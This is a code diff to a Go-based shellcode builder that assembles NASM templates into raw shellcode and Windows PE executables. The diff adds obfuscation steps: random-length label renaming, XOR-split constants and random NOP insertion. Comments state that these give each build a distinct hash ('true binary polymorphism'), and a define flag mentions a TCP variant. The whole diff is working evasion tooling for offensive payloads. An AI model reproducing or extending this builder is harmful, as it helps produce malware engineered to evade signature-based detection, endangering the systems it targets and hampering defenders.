@@ -11,6 +11,7 @@ import (
 	"path/filepath"
 	"regexp"
 	"slices"
+	"strconv"
 	"strings"
 )
 
@@ -26,11 +27,16 @@ type CompileRequest struct {
 	Format     string
 }
 
+var defineFlag string
+var doFlatten bool
+
 func main() {
 	c := &Compiler{}
 	flag.StringVar(&c.nasmPath, "nasm", "nasm", "path to NASM assembler")
 	flag.StringVar(&c.templateDir, "templates", "./templates", "ASM template directory")
 	flag.StringVar(&c.outputDir, "output", "./output", "compiled output directory")
+	flag.StringVar(&defineFlag, "D", "", "NASM preprocessor define (e.g. PLAIN_TCP)")
+	flag.BoolVar(&doFlatten, "flatten", false, "control-flow flattening (off by default: NASM local-label scoping is fragile)")
 	flag.Parse()
 
 	if err := os.MkdirAll(c.outputDir, 0755); err != nil {
@@ -85,7 +91,10 @@ func (c *Compiler) Compile(req CompileRequest) (string, error) {
 	log.Printf("applying obfuscation...")
 	obfuscated := c.obfuscateLabels(string(source))
 	obfuscated = c.obfuscateConstants(obfuscated)
-	obfuscated = c.flattenControlFlow(obfuscated)
+	obfuscated = c.insertNops(obfuscated)
+	if doFlatten {
+		obfuscated = c.flattenControlFlow(obfuscated)
+	}
 
 	buildDir := filepath.Join(c.outputDir, "build_"+randomSuffix())
 	if err := os.MkdirAll(buildDir, 0755); err != nil {
@@ -101,7 +110,12 @@ func (c *Compiler) Compile(req CompileRequest) (string, error) {
 	outputFile := filepath.Join(c.outputDir, req.OutputName+".bin")
 
 	log.Printf("assembling: %s -> %s", obfSource, objFile)
-	cmd := exec.Command(c.nasmPath, "-f", req.Format, "-o", objFile, obfSource)
+	nasmArgs := []string{"-f", req.Format}
+	if defineFlag != "" {
+		nasmArgs = append(nasmArgs, "-D"+defineFlag)
+	}
+	nasmArgs = append(nasmArgs, "-o", objFile, obfSource)
+	cmd := exec.Command(c.nasmPath, nasmArgs...)
 	cmd.Stderr = os.Stderr
 	if err := cmd.Run(); err != nil {
 		return "", fmt.Errorf("NASM assembly failed: %w", err)
@@ -112,20 +126,29 @@ func (c *Compiler) Compile(req CompileRequest) (string, error) {
 	}
 
 	log.Printf("extracting raw binary: %s -> %s", objFile, outputFile)
+	// PE emission is the primary product; raw shellcode kept as best-effort.
+	peFile := changeExt(outputFile, ".exe")
+	if err := linkCOFFtoPE(objFile, peFile, "_start"); err != nil {
+		log.Printf("PE emit failed: %v\n", err)
+	}
 	if err := c.extractRawBinary(objFile, outputFile); err != nil {
-		return "", fmt.Errorf("extract raw binary: %w", err)
+		log.Printf("raw binary skipped: %v\n", err)
+		return peFile, nil
 	}
+	log.Printf("output: PE %s, raw %s\n", peFile, outputFile)
+	return peFile, nil
+}
 
-	info, err := os.Stat(outputFile)
-	if err != nil {
-		return "", fmt.Errorf("stat output: %w", err)
+func changeExt(path, ext string) string {
+	for i := len(path) - 1; i >= 0; i-- {
+		if path[i] == '.' {
+			return path[:i] + ext
+		}
+		if path[i] == os.PathSeparator || path[i] == '/' {
+			break
+		}
 	}
-	if info.Size() > 15*1024 {
-		log.Printf("WARNING: output size %d bytes exceeds 15KB limit", info.Size())
-	}
-
-	log.Printf("output: %s (%d bytes)", outputFile, info.Size())
-	return outputFile, nil
+	return path + ext
 }
 
 func (c *Compiler) obfuscateLabels(source string) string {
@@ -139,12 +162,19 @@ func (c *Compiler) obfuscateLabels(source string) string {
 		}
 		original := parts[1]
 
-		if strings.HasPrefix(original, "_") || isReservedLabel(original) {
+		// NASM local labels are parent-scoped; renaming them to globals collides
+		if strings.HasPrefix(original, "_") || strings.HasPrefix(original, ".") ||
+			isReservedLabel(original) {
 			return match
 		}
 
 		if _, exists := references[original]; !exists {
-			references[original] = "L" + randomSuffix()
+			// variable-length names shift later offsets, so every build
+			// differs at the byte level (true binary polymorphism)
+			var nb [1]byte
+			rand.Read(nb[:])
+			n := 8 + 2*(int(nb[0])%8)
+			references[original] = "L" + randomHex(n) // n: 8..22 hex digits
 		}
 		return references[original] + parts[2]
 	})
@@ -195,8 +225,18 @@ func (c *Compiler) obfuscateConstants(source string) string {
 		}
 
 		newLine := constPattern.ReplaceAllStringFunc(line, func(match string) string {
+			orig, err := strconv.ParseUint(strings.TrimPrefix(strings.ToLower(match), "0x"), 16, 64)
+			if err != nil {
+				return match // not parseable: leave untouched
+			}
+			a, _ := strconv.ParseUint(randomHex(8), 16, 64)
+			b, _ := strconv.ParseUint(randomHex(8), 16, 64)
+			c := orig ^ a ^ b
+			if (c^a)^b != orig {
+				return match // self-check failed: keep the literal
+			}
 			count++
-			return fmt.Sprintf("(0x%s ^ 0x%s) ^ 0x%s", randomHex(8), randomHex(8), randomHex(8))
+			return fmt.Sprintf("(0x%x ^ 0x%x) ^ 0x%x", c, a, b)
 		})
 		result = append(result, newLine)
 	}
@@ -413,4 +453,37 @@ func randomHex(n int) string {
 	b := make([]byte, n/2)
 	rand.Read(b)
 	return hex.EncodeToString(b)
+}
+
+// insertNops sprinkles single-byte NOPs between instructions in the .text
+// section. This changes code offsets and therefore the encoded bytes, giving
+// every build a distinct hash (the label/constant rewrites alone fold back to
+// identical machine code). NOPs are semantically inert.
+func (c *Compiler) insertNops(source string) string {
+	lines := strings.Split(source, "\n")
+	inText := false
+	inserted := 0
+	for i := 0; i < len(lines); i++ {
+		t := strings.TrimSpace(lines[i])
+		if strings.HasPrefix(t, "section ") {
+			inText = strings.Contains(t, ".text")
+			continue
+		}
+		if !inText || t == "" || strings.HasPrefix(t, ";") || strings.HasPrefix(t, "%") {
+			continue
+		}
+		if strings.Contains(t, ":") {
+			continue
+		}
+		var nb [1]byte
+		rand.Read(nb[:])
+		if nb[0]%16 == 0 {
+			lines[i] = "    nop\n" + lines[i]
+			inserted++
+		}
+	}
+	if inserted > 0 {
+		log.Printf("inserted %d nops\n", inserted)
+	}
+	return strings.Join(lines, "\n")
 }
